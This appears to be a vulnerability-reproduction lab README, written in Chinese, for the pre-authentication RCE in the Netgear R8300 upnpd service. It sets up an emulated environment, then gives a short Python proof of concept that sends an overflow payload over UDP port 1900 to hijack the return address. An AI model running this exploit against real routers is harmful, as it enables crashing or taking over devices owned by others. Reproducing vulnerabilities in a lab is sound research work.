# Netgear R8300 upnpd PreAuth RCE 漏洞


## 漏洞环境

需要先构建 buildroot 环境，交叉编译得到 `nvram.so`：

```sh
$ arm-buildroot-linux-uclibcgnueabi-gcc -Wall -fPIC -shared nvram.c -o nvram.so
```

```sh
# 先将 nvram.so 复制到 system-emu/tools
$ docker-compose -f docker-compose-system.yml build

# 启动环境
$ docker-compose -f docker-compose-system.yml up
# 等待启动完成，重新开启一个窗口做后续操作
$ docker exec -it netgear-system /bin/bash
```

## 漏洞复现

```py
import socket
import struct

p32 = lambda x: struct.pack("<L", x)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = (
    0x604 * b'a' +  # dummy
    p32(0x7e2da53c) +  # v41
    (0x634 - 0x604 - 8) * b'a' +  # dummy
    p32(0x43434343)  # LR
)
s.connect(('192.168.2.2', 1900))
s.send(payload)
s.close()
```

## 参考链接

- https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211
- https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/
- https://paper.seebug.org/1311/
